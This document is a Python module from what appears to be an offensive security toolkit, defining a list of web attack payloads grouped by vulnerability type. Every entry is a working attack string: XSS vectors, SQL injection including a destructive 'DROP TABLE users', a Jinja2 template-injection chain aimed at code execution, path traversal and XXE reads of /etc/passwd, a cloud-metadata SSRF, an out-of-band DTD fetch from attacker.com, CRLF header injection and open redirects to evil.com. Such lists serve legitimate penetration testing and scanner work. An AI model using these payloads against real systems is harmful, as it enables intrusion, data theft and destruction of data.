"""
Web attack payloads — XSS, SQLi, SSTI, path traversal, XXE, CRLF, CORS.
Grouped by vuln_type for context_matcher lookup.
"""
from __future__ import annotations
from oneinfinity.arsenal.context_matcher import Payload

WEB_PAYLOADS = [
    # ── XSS — reflected/stored ───────────────────────────────────────────────
    Payload("<script>alert(1)</script>",        vuln_type="xss", complexity="simple",  tags=["xss","script"]),
    Payload("<script>alert(document.domain)</script>", vuln_type="xss", complexity="simple", tags=["xss","domain"]),
    Payload("'\"><script>alert(1)</script>",    vuln_type="xss", complexity="simple",  tags=["xss","break-out"]),
    Payload("<img src=x onerror=alert(1)>",     vuln_type="xss", complexity="simple",  tags=["xss","img","no-script"]),
    Payload("<svg onload=alert(1)>",             vuln_type="xss", complexity="simple",  tags=["xss","svg"]),
    Payload("<body onload=alert(1)>",            vuln_type="xss", complexity="simple",  tags=["xss","body"]),
    Payload("\"><img src=x onerror=alert(1) x=\"", vuln_type="xss", complexity="medium", tags=["xss","attribute-break"]),
    Payload("javascript:alert(1)",               vuln_type="xss", complexity="simple",  tags=["xss","javascript-uri"]),
    Payload("<details open ontoggle=alert(1)>",  vuln_type="xss", complexity="medium",  tags=["xss","html5","no-user-interaction"]),
    Payload("<iframe src='javascript:alert(1)'></iframe>", vuln_type="xss", complexity="medium", tags=["xss","iframe"]),
    Payload("'-alert(1)-'",                      vuln_type="xss", complexity="medium",  tags=["xss","js-context","backtick"]),
    Payload("${alert(1)}",                       vuln_type="xss", complexity="medium",  tags=["xss","template-literal","js"]),

    # ── SQLi — boolean / error-based ──────────────────────────────────────────
    Payload("'",                                 vuln_type="sqli", complexity="simple", tags=["sqli","probe"]),
    Payload("''",                                vuln_type="sqli", complexity="simple", tags=["sqli","double-quote-probe"]),
    Payload("1' AND 1=1--",                      vuln_type="sqli", complexity="simple", tags=["sqli","boolean-true"]),
    Payload("1' AND 1=2--",                      vuln_type="sqli", complexity="simple", tags=["sqli","boolean-false"]),
    Payload("1' OR '1'='1",                      vuln_type="sqli", complexity="simple", tags=["sqli","auth-bypass"]),
    Payload("1; DROP TABLE users--",             vuln_type="sqli", complexity="medium", tags=["sqli","destructive"], success_rate=0.1),
    Payload("1' UNION SELECT null--",            vuln_type="sqli", complexity="medium", tags=["sqli","union","columns"]),
    Payload("1' UNION SELECT null,null--",       vuln_type="sqli", complexity="medium", tags=["sqli","union","2col"]),
    Payload("1' UNION SELECT null,null,null--",  vuln_type="sqli", complexity="medium", tags=["sqli","union","3col"]),
    Payload("1 AND SLEEP(5)--",                  vuln_type="sqli", complexity="medium", tags=["sqli","time-based","mysql"], tech_stack=["mysql"]),
    Payload("1'; WAITFOR DELAY '0:0:5'--",       vuln_type="sqli", complexity="medium", tags=["sqli","time-based","mssql"], tech_stack=["asp"]),
    Payload("1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            vuln_type="sqli", complexity="complex", tags=["sqli","error-based","mssql"], tech_stack=["asp"]),

    # ── SSTI ──────────────────────────────────────────────────────────────────
    Payload("{{7*7}}",                           vuln_type="ssti", complexity="simple", tags=["ssti","jinja2","twig","probe"]),
    Payload("${7*7}",                            vuln_type="ssti", complexity="simple", tags=["ssti","freemarker","el","probe"]),
    Payload("#{7*7}",                            vuln_type="ssti", complexity="simple", tags=["ssti","ruby-erb","pebble"]),
    Payload("<%= 7*7 %>",                        vuln_type="ssti", complexity="simple", tags=["ssti","erb","ruby"], tech_stack=["ruby"]),
    Payload("{{7*'7'}}",                         vuln_type="ssti", complexity="simple", tags=["ssti","jinja2","twig","discriminator"]),
    Payload("{{config}}",                        vuln_type="ssti", complexity="medium", tags=["ssti","jinja2","flask-config"], tech_stack=["python"]),
    Payload("{{self.__class__.__mro__[1].__subclasses__()}}", vuln_type="ssti", complexity="complex",
            tags=["ssti","jinja2","rce"], tech_stack=["python"]),

    # ── Path traversal ────────────────────────────────────────────────────────
    Payload("../../../etc/passwd",               vuln_type="path_traversal", complexity="simple", tags=["lfi","linux"]),
    Payload("..%2f..%2f..%2fetc%2fpasswd",       vuln_type="path_traversal", complexity="medium", tags=["lfi","url-encode"]),
    Payload("....//....//....//etc/passwd",      vuln_type="path_traversal", complexity="medium", tags=["lfi","double-dot"]),
    Payload("/etc/passwd",                       vuln_type="path_traversal", complexity="simple", tags=["lfi","absolute-path"]),
    Payload("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            vuln_type="path_traversal", complexity="simple", tags=["lfi","windows"]),
    Payload("php://filter/convert.base64-encode/resource=/etc/passwd",
            vuln_type="path_traversal", complexity="complex", tags=["lfi","php-wrapper"], tech_stack=["php"]),

    # ── XXE ────────────────────────────────────────────────────────────────────
    Payload('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            vuln_type="xxe", complexity="medium", tags=["xxe","file-read","linux"]),
    Payload('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            vuln_type="xxe", complexity="medium", tags=["xxe","ssrf","cloud-metadata"]),
    Payload('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>test</foo>',
            vuln_type="xxe", complexity="complex", tags=["xxe","blind","oob"]),

    # ── CRLF injection ────────────────────────────────────────────────────────
    Payload("%0d%0aSet-Cookie: session=attacker",
            vuln_type="crlf", complexity="simple", tags=["crlf","cookie-injection"]),
    Payload("%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
            vuln_type="crlf", complexity="medium", tags=["crlf","xss","header-injection"]),
    Payload("\r\nLocation: https://attacker.com",
            vuln_type="crlf", complexity="simple", tags=["crlf","redirect"]),

    # ── Open redirect ─────────────────────────────────────────────────────────
    Payload("//evil.com",                        vuln_type="open_redirect", complexity="simple", tags=["redirect","double-slash"]),
    Payload("https://evil.com",                  vuln_type="open_redirect", complexity="simple", tags=["redirect"]),
    Payload("/\\evil.com",                       vuln_type="open_redirect", complexity="simple", tags=["redirect","backslash"]),
    Payload("https://legitimate.com.evil.com",   vuln_type="open_redirect", complexity="simple", tags=["redirect","subdomain"]),
]
